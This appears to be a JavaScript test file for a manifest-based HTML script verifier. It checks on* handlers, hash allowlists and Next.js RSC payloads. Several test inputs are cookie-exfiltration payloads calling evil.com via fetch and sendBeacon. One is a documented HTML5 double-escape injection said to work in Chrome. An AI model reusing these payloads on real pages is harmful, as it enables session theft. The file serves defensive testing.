import { describe, it, expect } from 'vitest';
import { verifyScripts, VALIDATORS } from '../manifest/html/script-verifier.js';

const nextjsRsc = VALIDATORS['nextjs-rsc'];
import { calculateHash } from '../../core/crypto.js';

// scriptHash computes the hash of a script's raw UTF-8 bytes, matching what
// the tokenizer extracts and what the build tool must write into #scripts.
const scriptHash = (content) => calculateHash(new TextEncoder().encode(content).buffer);

// ── on* event handler detection ───────────────────────────────────────────────

describe('on* event handler detection', () => {
    it('flags onclick on a button', async () => {
        const result = await verifyScripts('<button onclick="evil()">click</button>', nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('flags onerror on an img', async () => {
        const result = await verifyScripts('<img src="x.png" onerror="evil()">', nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('flags onmouseover anywhere in the document', async () => {
        const result = await verifyScripts(
            '<html><body><p onmouseover="steal()">hover me</p></body></html>',
            nextjsRsc
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('stops parsing after the first on* violation — scriptContent is "attrname:value"', async () => {
        const result = await verifyScripts(
            '<div onclick="a()"></div><div onclick="b()"></div>',
            nextjsRsc
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
        expect(result.scriptContent).toBe('onclick:a()');
    });

    it('does not flag a data- attribute that starts with "on" in its suffix', async () => {
        const result = await verifyScripts('<div data-on="something">text</div>', nextjsRsc);
        expect(result).toBeNull();
    });

    it('flags on* even when valid RSC scripts are also present', async () => {
        const html =
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<button onclick="evil()">x</button>';
        const result = await verifyScripts(html, nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });
});

// ── #handlers allowlist ───────────────────────────────────────────────────────

describe('#handlers manifest allowlist', () => {
    const FILE_KEY = '/index.html';
    const manifest = (handlers) => ({ files: { [FILE_KEY + '#handlers']: handlers } });

    it('allows a handler listed in manifest #handlers', async () => {
        const result = await verifyScripts(
            '<button onclick="handleClick()">ok</button>',
            nextjsRsc,
            FILE_KEY,
            manifest(['onclick:handleClick()'])
        );
        expect(result).toBeNull();
    });

    it('blocks a handler whose value is not in the allowlist', async () => {
        const result = await verifyScripts(
            '<button onclick="evil()">x</button>',
            nextjsRsc,
            FILE_KEY,
            manifest(['onclick:handleClick()'])
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
        expect(result.scriptContent).toBe('onclick:evil()');
    });

    it('is sensitive to the attribute name — same value under different event is blocked', async () => {
        const result = await verifyScripts(
            '<button onmousedown="handleClick()">x</button>',
            nextjsRsc,
            FILE_KEY,
            manifest(['onclick:handleClick()'])
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('allows multiple handlers listed individually', async () => {
        const html =
            '<button onclick="handleClick()">a</button>' + '<form onsubmit="submitForm()">b</form>';
        const result = await verifyScripts(
            html,
            nextjsRsc,
            FILE_KEY,
            manifest(['onclick:handleClick()', 'onsubmit:submitForm()'])
        );
        expect(result).toBeNull();
    });

    it('blocks if any handler in the document is not in the allowlist', async () => {
        const html =
            '<button onclick="handleClick()">a</button>' + '<div onmouseover="evil()">b</div>';
        const result = await verifyScripts(
            html,
            nextjsRsc,
            FILE_KEY,
            manifest(['onclick:handleClick()'])
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('treats an empty #handlers list as no allowlist — all on* are blocked', async () => {
        const result = await verifyScripts(
            '<button onclick="handleClick()">x</button>',
            nextjsRsc,
            FILE_KEY,
            manifest([])
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('with no manifest, all on* are blocked', async () => {
        const result = await verifyScripts('<button onclick="handleClick()">x</button>', nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });
});

// ── #scripts hash verification ────────────────────────────────────────────────

describe('#scripts manifest hash verification', () => {
    const FILE_KEY = '/index.html';
    const withScripts = (hashes) => ({ files: { [FILE_KEY + '#scripts']: hashes } });

    it('without #scripts in manifest, unclaimed scripts are silently skipped', async () => {
        const result = await verifyScripts(
            '<html><body><script>console.log("telemetry")</script></body></html>',
            nextjsRsc
        );
        expect(result).toBeNull();
    });

    it('with #scripts present, unclaimed script whose hash matches is allowed', async () => {
        const content = 'console.log("telemetry")';
        const hash = await scriptHash(content);
        const result = await verifyScripts(
            `<html><body><script>${content}</script></body></html>`,
            nextjsRsc,
            FILE_KEY,
            withScripts([hash])
        );
        expect(result).toBeNull();
    });

    it('with #scripts present, unclaimed script whose hash is not listed is a violation', async () => {
        const result = await verifyScripts(
            '<html><body><script>evil()</script></body></html>',
            nextjsRsc,
            FILE_KEY,
            withScripts([])
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('with #scripts present, all unclaimed scripts must match', async () => {
        const known = 'console.log("ok")';
        const hash = await scriptHash(known);
        const html = `<script>${known}</script><script>evil()</script>`;
        const result = await verifyScripts(html, nextjsRsc, FILE_KEY, withScripts([hash]));
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
        expect(result.scriptContent).toBe('evil()');
    });

    it('#scripts does not affect claimed RSC scripts — those go through the validator', async () => {
        const html =
            '<script>self.__next_f.push([0,fetch("evil")])</script>' +
            '<script>console.log("ok")</script>';
        const hash = await scriptHash('console.log("ok")');
        const result = await verifyScripts(html, nextjsRsc, FILE_KEY, withScripts([hash]));
        // RSC script with expression payload fails the validator — violation regardless of #scripts
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });
});

// ── clean documents ───────────────────────────────────────────────────────────

describe('clean documents', () => {
    it('returns null for a document with no scripts and no event handlers', async () => {
        const result = await verifyScripts('<html><body><p>hello</p></body></html>', nextjsRsc);
        expect(result).toBeNull();
    });

    it('returns null for a valid RSC page', async () => {
        const html =
            '<!DOCTYPE html><html><body>' +
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<script>self.__next_f.push([0,{"title":"Home"}])</script>' +
            '</body></html>';
        const result = await verifyScripts(html, nextjsRsc);
        expect(result).toBeNull();
    });

    it('returns null for a document with only external scripts', async () => {
        const result = await verifyScripts(
            '<html><body><script src="/app.js"></script></body></html>',
            nextjsRsc
        );
        expect(result).toBeNull();
    });
});

// ── RSC violations ────────────────────────────────────────────────────────────

describe('RSC script violations', () => {
    it('flags an RSC push with a non-JSON expression payload', async () => {
        const result = await verifyScripts(
            '<script>self.__next_f.push([0,fetch("https://evil.com?c="+document.cookie)])</script>',
            nextjsRsc
        );
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('flags a truncated RSC script (EOF before </script>)', async () => {
        const result = await verifyScripts('<script>self.__next_f.push([0,{"x":1}])', nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });
});

// ── HTML5 script-data double-escape — blocked by hazard scanner ──────────────
//
// Confirmed exploitable in Chrome (see scripts/verify-double-escape.js).
// See nextjs-rsc-validator.test.js for the full mechanism description.
//
// Exploit shape — browser executes fetch(), tokenizer does not implement the
// Double Escaped states and closes at the first </script>:
//
//   <script>self.__next_f.push([0,"<!--<script>"])</script>/
//   fetch("https://evil.com?c="+document.cookie)
//   </script>
//
// Mitigation: the tokenizer fires onHazard('script-html-comment') at the
// third character of <!--, before any </script> is reached. verifyScripts
// registers onHazard and cancels, returning a violation immediately.

describe('HTML5 script-data double-escape — blocked by hazard scanner', () => {
    it('blocks a page containing the confirmed exploit', async () => {
        const html =
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<script>self.__next_f.push([0,"<!--<script>"])</script>/\n' +
            'fetch("https://evil.com?c="+document.cookie)\n' +
            '</script>';

        const result = await verifyScripts(html, nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('blocks with arbitrary multi-statement injection', async () => {
        const html =
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<script>self.__next_f.push([0,"<!--<script>"])</script>/\n' +
            'const x = document.cookie;\n' +
            'navigator.sendBeacon("https://evil.com", x);\n' +
            '</script>';

        const result = await verifyScripts(html, nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('blocks when the trigger is inside a nested JSON object value', async () => {
        const html =
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<script>self.__next_f.push([0,{"k":"<!--<script>"}])</script>/\n' +
            'evil()\n' +
            '</script>';

        const result = await verifyScripts(html, nextjsRsc);
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });

    it('blocks even when #scripts is present', async () => {
        const html =
            '<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>' +
            '<script>self.__next_f.push([0,"<!--<script>"])</script>/\n' +
            'evil()\n' +
            '</script>';

        const result = await verifyScripts(html, nextjsRsc, '/index.html', {
            files: { '/index.html#scripts': [] },
        });
        expect(result).not.toBeNull();
        expect(result.violation).toBe(true);
    });
});

// ── error handling ────────────────────────────────────────────────────────────
